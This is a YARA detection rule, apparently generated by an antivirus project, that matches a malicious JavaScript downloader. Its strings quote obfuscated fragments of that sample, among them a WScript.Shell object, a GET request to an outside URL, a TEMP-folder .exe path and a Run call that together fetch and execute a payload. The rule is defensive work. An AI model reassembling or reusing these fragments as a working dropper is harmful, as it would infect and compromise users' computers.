rule sig_20160401_ef9c9f1b2c5a5ea2b8b77c0f30065964 {
  meta:
    description = "datamaliciousorder - file 20160401_ef9c9f1b2c5a5ea2b8b77c0f30065964.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a5eb974819c7361276526a9dca25d83602fe023c95542f56033ea323eb0fe6db"

  strings:
    $s1  = "function DsDf(NvnVm, XsZvk){SvkMy = SvkMy * 1; return NvnVm - XsZvk;};" fullword ascii
    $s2  = "var NraJat = function ZujPq() {return WScript[NjTe](\"WScript\"+\".Shell\");}(), JwJc = 11;" fullword ascii
    $s3  = "if (TotFb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "TotFb[PkNpk](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s5  = "function QcoZd() {return NraJat[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sIOospW2.ex\" + \"e\";};" fullword ascii
    $s6  = "function TtJne(){return RuYaa + \"\";};" fullword ascii
    $s7  = "function BfBd() {return ((LcxImw == true) && (LcxImw == NzyTrv)) ? 1 : SvkMy;};" fullword ascii
    $s8  = "var NzyTrv = false;" fullword ascii
    $s9  = "var LcxImw = false;" fullword ascii
    $s10 = "var ItAq = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (UriGux);" fullword ascii
    $s12 = "function ShjKwz(OboCs) {var OgaCjb = (1, 2, 3, 4, 5, OboCs); return OgaCjb;};" fullword ascii
    $s13 = "function OuUp(){return NjTe;};" fullword ascii
    $s14 = "function MvGct()" fullword ascii
    $s15 = "function CdTj(){return 23;};" fullword ascii
    $s16 = "return DsDf(SbpWv, WkaWw);" fullword ascii
    $s17 = "function PkQq(YfUg){NraJat[\"R\"+\"un\"](YfUg, SvkMy, SvkMy);};" fullword ascii
    $s18 = "NzyTrv = true; " fullword ascii
    $s19 = "LcxImw = true; " fullword ascii
    $s20 = "var KdyRkx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}